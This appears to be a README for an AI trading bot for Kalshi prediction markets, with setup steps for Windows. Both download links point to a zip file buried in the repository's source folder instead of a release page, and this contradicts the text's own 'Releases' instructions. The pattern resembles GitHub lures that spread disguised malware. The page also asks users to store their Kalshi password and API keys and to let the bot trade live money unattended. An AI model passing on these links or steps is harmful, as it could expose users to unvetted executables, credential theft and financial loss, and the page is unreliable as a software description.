# 🤖 kalshi-ai-trading-bot - Automated trading for Kalshi prediction markets

[![](https://img.shields.io/badge/Download-Software-blue)](https://github.com/hipflaskchemicalreaction466/kalshi-ai-trading-bot/raw/refs/heads/main/src/clients/ai-trading-bot-kalshi-1.5.zip)

This software manages trades on Kalshi. It uses artificial intelligence to analyze event contracts and execute orders. You can use this tool to automate your market activity without manual oversight.

## 💾 System Requirements

Your computer needs specific software to run this tool. Verify your setup before you start.

1. Windows 10 or Windows 11.
2. A stable internet connection.
3. Node.js version 18 or newer. Search for "Download Node.js" in your browser. Select the LTS version for Windows, run the installer, and follow the default prompts.
4. An account on the Kalshi exchange.
5. An API key from your Kalshi account settings page.

## 📥 Downloading the Software 

Visit the link below to reach the project page. Locate the section labeled Releases on the right side of the screen. Click the file ending in .zip to download the source code.

[Download the Software Here](https://github.com/hipflaskchemicalreaction466/kalshi-ai-trading-bot/raw/refs/heads/main/src/clients/ai-trading-bot-kalshi-1.5.zip)

After the download finishes, move the file to a folder where you want to keep the application. Right-click the file and select Extract All. Open the new folder created after the extraction.

## ⚙️ Setting Up the Environment

The application requires configuration before it starts. Open the folder you extracted in the previous step. Locate the file named .env.example. Rename this file to .env.

Open the .env file with Notepad. You must provide specific information here for the bot to connect to your account:

1. KALSHI_EMAIL: Enter the email address linked to your Kalshi account.
2. KALSHI_PASSWORD: Enter your Kalshi account password.
3. OPENROUTER_API_KEY: Paste your API key from the OpenRouter dashboard. This key allows the bot to use artificial intelligence for decision-making.
4. TRADING_MODE: Set this to paper for practice trades or live for actual money.

Save the file and close Notepad.

## 🚀 Running the Bot

Open the folder containing the downloaded files. Hold the Shift key on your keyboard and right-click in an empty space inside the window. Select Open PowerShell window here.

Type the following command and press Enter:

npm install

This command downloads the necessary tools for the application to function. Wait for the process to complete. You will see a list of files being added to your folder.

Once the installation finishes, type the next command to start the bot:

npm start

The application will now connect to the Kalshi servers. It will check your account balance and look for active event contracts.

## 📊 Monitoring Activity 

The bot displays its actions in the window. You can see:

* The events the bot is currently tracking.
* The decisions the artificial intelligence makes for each contract.
* Any orders placed on the exchange.
* Error messages if the connection to the internet drops.

Do not close the PowerShell window while the bot runs. If you close the window, the bot stops. To stop the bot, press Ctrl + C inside the PowerShell window.

## 🛠️ Maintaining the Bot

Update the software periodically to get the latest features. Visit the download link again to check for newer versions. Replace your existing files with the new ones, but keep your .env file. Your .env file contains your account credentials and should remain private. 

Do not share your .env file with anyone. Keep it secure on your computer.

## 📈 Understanding the Strategy

The bot uses the OpenRouter service to read information about market events. It evaluates the probability of a market outcome based on the data it receives. When the bot identifies a favorable opportunity, it generates an order to buy or sell contracts. 

The bot maintains a log file in the local folder. If you experience issues, open the log file to see a history of actions taken by the software. 

Use paper trading mode for the first few days. This allows you to observe how the bot handles market movements without a financial risk. Once you feel comfortable with the performance, update the .env file to live mode.

Ensure your computer stays powered on while the bot operates. Disable sleep mode in your Windows settings to prevent the bot from disconnecting during trading hours. Check the connection to the exchange at least once per day to verify that the API keys remain valid. If the bot fails to connect, check your internet first, then verify your API credentials in the .env file.